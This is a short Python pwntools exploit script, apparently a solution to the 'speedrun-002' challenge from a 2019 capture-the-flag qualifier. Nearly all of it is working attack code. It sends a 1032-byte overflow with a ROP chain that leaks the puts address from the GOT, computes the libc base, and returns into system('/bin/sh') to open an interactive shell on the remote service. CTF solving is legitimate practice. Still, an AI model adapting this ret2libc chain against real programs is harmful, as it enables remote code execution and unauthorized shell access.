from pwn import *

local = 0
if local:
	p = process('./pwn')
else:
	p = remote('speedrun-002.quals2019.oooverflow.io', 31337)
elf = ELF('./pwn')
libc = ELF('./libc.so')

context.log_level='debug'

#gdb.attach(p)

p.recv()
p.sendline('Everything intelligent is so boring.')
p.recv()

pop_rdi_ret = 0x00000000004008a3

pl = 1032*'a'
pl += p64(pop_rdi_ret) + p64(elf.got['puts'])
pl += p64(elf.plt['puts'])
pl += p64(0x00000000004007CE)

p.sendline(pl)

p.recvuntil('.\n')
puts_addr = u64(p.recv(6).ljust(8, '\x00'))
print hex(puts_addr)

libc_base = puts_addr - libc.symbols['puts']
system = libc_base + libc.symbols['system']
bin_addr = libc_base + libc.search('/bin/sh').next()

p.recv()
p.sendline('Everything intelligent is so boring.')
p.recv()

pl = 1032*'a'
pl += p64(pop_rdi_ret) + p64(bin_addr)
pl += p64(system)

#gdb.attach(p)
p.sendline(pl)


p.interactive()
